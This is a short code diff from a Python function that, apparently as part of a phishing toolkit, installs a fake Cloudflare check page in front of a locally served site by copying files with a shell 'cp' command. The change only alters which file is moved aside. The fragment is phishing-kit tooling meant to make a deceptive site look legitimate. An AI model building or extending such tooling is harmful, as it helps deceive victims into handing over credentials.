@@ -601,7 +601,7 @@ def addingCloudfare():
             sleep(1)           
            
 def addCloudfare():
-         system('cp Server/www/index.html Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
+         system('cp Server/www/index.* Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
          print(_("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...").format(MAIN0, MAIN4))
          sleep(2)
 		
